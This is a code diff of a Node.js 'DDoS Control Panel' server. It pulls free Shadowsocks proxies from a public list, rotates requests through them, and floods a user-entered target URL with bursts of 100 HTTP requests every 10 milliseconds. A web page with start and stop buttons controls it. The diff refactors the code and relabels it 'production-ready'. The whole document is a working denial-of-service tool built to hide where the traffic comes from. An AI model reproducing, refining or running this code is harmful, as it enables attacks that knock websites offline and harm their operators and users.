@@ -1,16 +1,6 @@
-// server.js - Multi-Proxy DDoS Panel with 15‑min proxy refresh (shadowsocks-libev)
+// server.js - Production-ready DDoS Panel with 15-min proxy refresh
 const fastify = require('fastify')({ logger: false });
-
-// Load Shadowsocks library – will crash on startup if missing
-let ss;
-try {
-    ss = require('shadowsocks-libev');
-    console.log('✅ Shadowsocks-libev loaded');
-} catch (e) {
-    console.error('❌ Failed to load shadowsocks-libev:', e.message);
-    process.exit(1);
-}
-
+const ss = require('shadowsocks');
 const { SocksProxyAgent } = require('socks-proxy-agent');
 const axios = require('axios');
 
@@ -18,7 +8,7 @@ const axios = require('axios');
 const PROXY_LIST_URL = 'https://raw.githubusercontent.com/ebrasha/free-v2ray-public-list/main/ss_configs.txt';
 const MAX_PROXIES = 8;
 const REQS_PER_BURST = 100;
-const BURST_INTERVAL = 10;
+const BURST_INTERVAL = 10; // ms
 const REFRESH_INTERVAL = 15 * 60 * 1000; // 15 minutes
 
 // ========== STATE ==========
@@ -32,7 +22,7 @@ let attackStats = { requests: 0, errors: 0 };
 // ========== PROXY MANAGEMENT ==========
 function parseSS(url) {
     try {
-        let cleanUrl = url.split('#')[0].trim();
+        const cleanUrl = url.split('#')[0].trim();
         const match = cleanUrl.match(/^ss:\/\/([^@]+)@([^:]+):(\d+)/);
         if (!match) return null;
         const encoded = match[1];
@@ -42,7 +32,7 @@ function parseSS(url) {
         const [method, password] = decoded.split(':');
         if (!method || !password) return null;
         return { method, password, server, port };
-    } catch (e) {
+    } catch {
         return null;
     }
 }
@@ -76,9 +66,7 @@ async function startProxyServer(config, localPort) {
                 console.log(`✅ Proxy ${localPort} -> ${config.server}:${config.port}`);
                 resolve(server);
             });
-            server.on('error', (err) => {
-                console.error(`❌ Proxy ${localPort} error:`, err.message);
-            });
+            server.on('error', (err) => console.error(`❌ Proxy ${localPort} error:`, err.message));
         } catch (err) {
             reject(err);
         }
@@ -86,11 +74,8 @@ async function startProxyServer(config, localPort) {
 }
 
 async function startProxyPool() {
-    if (proxyConfigs.length === 0) {
-        console.error('No proxy configs available');
-        return false;
-    }
-    const shuffled = proxyConfigs.sort(() => 0.5 - Math.random());
+    if (proxyConfigs.length === 0) return false;
+    const shuffled = [...proxyConfigs].sort(() => 0.5 - Math.random());
     const selected = shuffled.slice(0, MAX_PROXIES);
     proxyServers = [];
     socksAgents = [];
@@ -120,25 +105,20 @@ async function stopProxyPool() {
     console.log('All proxies stopped');
 }
 
-// ========== ATTACK ENGINE ==========
 async function runAttack(target, duration) {
     const endTime = Date.now() + duration * 1000;
     console.log(`Attack started on ${target} for ${duration}s`);
 
     while (attackActive && Date.now() < endTime) {
         for (let i = 0; i < REQS_PER_BURST; i++) {
-            if (!attackActive) break;
-            if (socksAgents.length === 0) break;
+            if (!attackActive || socksAgents.length === 0) break;
 
             const agent = socksAgents[currentProxyIndex % socksAgents.length];
             currentProxyIndex++;
 
-            axios.get(target, {
-                httpAgent: agent,
-                httpsAgent: agent,
-                timeout: 5000
-            }).catch(() => attackStats.errors++)
-              .finally(() => attackStats.requests++);
+            axios.get(target, { httpAgent: agent, httpsAgent: agent, timeout: 5000 })
+                .catch(() => attackStats.errors++)
+                .finally(() => attackStats.requests++);
         }
         await new Promise(r => setTimeout(r, BURST_INTERVAL));
     }
@@ -149,8 +129,7 @@ async function runAttack(target, duration) {
 }
 
 // ========== WEB INTERFACE ==========
-const html = `
-<!DOCTYPE html>
+const html = `<!DOCTYPE html>
 <html>
 <head>
     <title>DDoS Control Panel</title>
@@ -177,40 +156,22 @@ const html = `
 <body>
     <div class="container">
         <h1>DDoS Control Panel</h1>
-
         <div class="status" id="status">Online</div>
-
         <div class="stats">
-            <div class="stat-box">
-                <div class="stat-value" id="reqCount">0</div>
-                <div class="stat-label">Requests</div>
-            </div>
-            <div class="stat-box">
-                <div class="stat-value" id="errCount">0</div>
-                <div class="stat-label">Errors</div>
-            </div>
-            <div class="stat-box">
-                <div class="stat-value" id="proxyCount">0</div>
-                <div class="stat-label">Proxies</div>
-            </div>
+            <div class="stat-box"><div class="stat-value" id="reqCount">0</div><div class="stat-label">Requests</div></div>
+            <div class="stat-box"><div class="stat-value" id="errCount">0</div><div class="stat-label">Errors</div></div>
+            <div class="stat-box"><div class="stat-value" id="proxyCount">0</div><div class="stat-label">Proxies</div></div>
         </div>
-
         <label for="target">Target URL (http:// or https://)</label>
         <input type="url" id="target" placeholder="https://example.com" required>
-
         <label for="duration">Duration (seconds)</label>
         <input type="number" id="duration" value="60" min="1" max="3600">
-
         <div class="button-group">
             <button id="startBtn">START ATTACK</button>
             <button id="stopBtn">STOP ATTACK</button>
         </div>
-
-        <div class="footer">
-            Using up to 8 concurrent Shadowsocks proxies from ebrasha/free-v2ray-public-list (refreshed every 15 min)
-        </div>
+        <div class="footer">Proxies refreshed every 15 minutes</div>
     </div>
-
     <script>
         async function updateStatus() {
             try {
@@ -220,116 +181,63 @@ const html = `
                 document.getElementById('reqCount').innerText = data.stats.requests;
                 document.getElementById('errCount').innerText = data.stats.errors;
                 document.getElementById('proxyCount').innerText = data.proxies;
-            } catch (err) {
-                console.error('Status update error:', err);
-            }
+            } catch (err) { console.error(err); }
         }
-
         async function startAttack() {
             const target = document.getElementById('target').value;
             const duration = parseInt(document.getElementById('duration').value);
-
-            if (!target) {
-                alert('Please enter a target URL');
-                return;
-            }
-
+            if (!target) return alert('Please enter a target URL');
             try {
                 const res = await fetch('/start', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ target, duration })
                 });
-                // Always try to parse JSON, but if fails, show response text
-                let data;
-                const contentType = res.headers.get('content-type');
-                if (contentType && contentType.includes('application/json')) {
-                    data = await res.json();
-                } else {
-                    const text = await res.text();
-                    throw new Error(`Server returned non-JSON: ${text.substring(0,100)}`);
-                }
-                if (!data.success) {
-                    alert('Error: ' + data.error);
-                } else {
-                    updateStatus();
-                }
-            } catch (err) {
-                alert('Network error: ' + err.message);
-                console.error(err);
-            }
+                const data = await res.json();
+                if (!data.success) alert('Error: ' + data.error);
+                else updateStatus();
+            } catch (err) { alert('Network error: ' + err.message); }
         }
-
         async function stopAttack() {
             try {
                 const res = await fetch('/stop', { method: 'POST' });
                 const data = await res.json();
-                if (!data.success) {
-                    alert('Error: ' + data.error);
-                } else {
-                    updateStatus();
-                }
-            } catch (err) {
-                alert('Network error: ' + err.message);
-                console.error(err);
-            }
+                if (!data.success) alert('Error: ' + data.error);
+                else updateStatus();
+            } catch (err) { alert('Network error: ' + err.message); }
         }
-
         document.getElementById('startBtn').addEventListener('click', startAttack);
         document.getElementById('stopBtn').addEventListener('click', stopAttack);
         setInterval(updateStatus, 1000);
         updateStatus();
     </script>
 </body>
-</html>
-`;
+</html>`;
 
 // ========== FASTIFY ROUTES ==========
 fastify.get('/', (req, reply) => reply.type('text/html').send(html));
-
-fastify.get('/status', (req, reply) => {
-    reply.send({
-        running: attackActive,
-        stats: attackStats,
-        proxies: socksAgents.length
-    });
-});
+fastify.get('/status', (req, reply) => reply.send({ running: attackActive, stats: attackStats, proxies: socksAgents.length }));
 
 fastify.post('/start', async (req, reply) => {
     try {
         const { target, duration } = req.body;
-        if (!target || !duration) {
-            return reply.status(400).send({ success: false, error: 'Missing target or duration' });
-        }
+        if (!target || !duration) return reply.status(400).send({ success: false, error: 'Missing target or duration' });
 
-        // Stop any ongoing attack
         attackActive = false;
         await stopProxyPool();
 
-        // Ensure we have proxies
-        if (proxyConfigs.length === 0) {
-            proxyConfigs = await fetchProxyConfigs();
-        }
-        if (proxyConfigs.length === 0) {
-            return reply.status(500).send({ success: false, error: 'No proxies available' });
-        }
+        if (proxyConfigs.length === 0) proxyConfigs = await fetchProxyConfigs();
+        if (proxyConfigs.length === 0) return reply.status(500).send({ success: false, error: 'No proxies available' });
 
-        // Start proxy pool
         const started = await startProxyPool();
-        if (!started) {
-            return reply.status(500).send({ success: false, error: 'Failed to start any proxy' });
-        }
+        if (!started) return reply.status(500).send({ success: false, error: 'Failed to start any proxy' });
 
-        // Reset stats and start attack
         attackStats = { requests: 0, errors: 0 };
         attackActive = true;
-
-        // Run attack asynchronously
         runAttack(target, duration).catch(console.error);
-
         reply.send({ success: true });
     } catch (err) {
-        console.error('Unhandled error in /start:', err);
+        console.error(err);
         reply.status(500).send({ success: false, error: err.message });
     }
 });
@@ -340,27 +248,23 @@ fastify.post('/stop', async (req, reply) => {
         await stopProxyPool();
         reply.send({ success: true });
     } catch (err) {
-        console.error('Unhandled error in /stop:', err);
+        console.error(err);
         reply.status(500).send({ success: false, error: err.message });
     }
 });
 
-// Global error handler for Fastify
-fastify.setErrorHandler((error, request, reply) => {
-    console.error('Fastify error:', error);
+fastify.setErrorHandler((error, req, reply) => {
+    console.error(error);
     reply.status(500).send({ success: false, error: error.message });
 });
 
 // ========== INIT ==========
 async function init() {
     proxyConfigs = await fetchProxyConfigs();
-    // Refresh every 15 minutes in background
     setInterval(async () => {
         const newConfigs = await fetchProxyConfigs();
-        if (newConfigs.length > 0) {
-            proxyConfigs = newConfigs;
-            console.log('Proxy list refreshed (background)');
-        }
+        if (newConfigs.length > 0) proxyConfigs = newConfigs;
+        console.log('Proxy list refreshed (background)');
     }, REFRESH_INTERVAL);
 
     const port = process.env.PORT || 5000;
